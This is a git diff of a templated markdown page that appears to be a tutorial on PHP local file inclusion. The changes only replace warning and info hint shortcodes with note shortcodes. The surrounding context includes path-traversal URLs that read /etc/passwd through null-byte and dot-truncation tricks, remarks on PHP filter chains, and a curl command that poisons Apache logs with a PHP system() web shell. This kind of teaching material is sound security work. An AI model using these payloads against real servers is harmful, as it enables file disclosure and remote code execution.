@@ -71,10 +71,10 @@ ignore the following characters.
 http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd%00
 ```
 
-{{<hint warning>}}
+{{<note>}}
 PHP fixed the issue
 in version 5.3.4. <https://bugs.php.net/bug.php?id=39863>
-{{</hint>}}
+{{</note>}}
 
 ### Dot Truncation
 
@@ -91,10 +91,10 @@ http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd/./././././
 http://{{< param "war.rdomain" >}}/index.php?page=../../../[ADD MORE]../../../../../etc/passwd
 ```
 
-{{<hint warning>}}
+{{<note>}}
 In PHP:
 `/etc/passwd` = `/etc//passwd` = `/etc/./passwd` = `/etc/passwd/` = `/etc/passwd/`
-{{</hint>}}
+{{</note>}}
 
 ### Encoding
 
@@ -222,10 +222,10 @@ The resulting data
 is the encoded version
 of the given file's source code.
 
-{{<hint info>}}
+{{<note>}}
 Multiple [filter](https://www.php.net/manual/en/filters.php) chains can be specified on one path,
 chained using `|` or `/`.
-{{</hint>}}
+{{</note>}}
 
 #### Filter [string.rot13](https://www.php.net/manual/en/filters.string.php#filters.string.rot13).
 
@@ -430,14 +430,14 @@ and successively,
 through LFI,
 include and execute the code.
 
-{{<hint info>}}
+{{<note>}}
 It is recommended to first load the target log,
 not only to verify the access
 but to identify what data is being stored.
 
 Administrators can modify the logged data
 according to their needs.
-{{</hint>}}
+{{</note>}}
 
 ### Apache
 
@@ -466,13 +466,13 @@ with the suitable `Referer` header.
 curl -H 'Referer' --data "<?php system($_GET['c']); ?>" "http://{{< param "war.rdomain" >}}/invalid#req" -v
 ```
 
-{{<hint warning>}}
+{{<note>}}
 The Apache logging API
 escapes strings going to the logs.
 
 Use single quotes (`'`)
 since double quotes (`"`) are replaced escaped as `"quote";`
-{{</hint>}}
+{{</note>}}
 
 #### LFI
 
